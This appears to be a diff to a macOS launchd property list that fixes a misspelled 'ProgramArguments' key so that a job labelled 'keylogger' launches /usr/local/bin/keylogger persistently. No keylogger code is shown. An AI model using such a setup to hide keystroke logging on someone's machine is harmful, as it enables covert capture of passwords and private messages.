@@ -4,7 +4,7 @@
 <dict>
   <key>Label</key>
   <string>keylogger</string>
-  <key>ProgramArguements</key>
+  <key>ProgramArguments</key>
   <array>
       <string>/usr/local/bin/keylogger</string>
   </array>
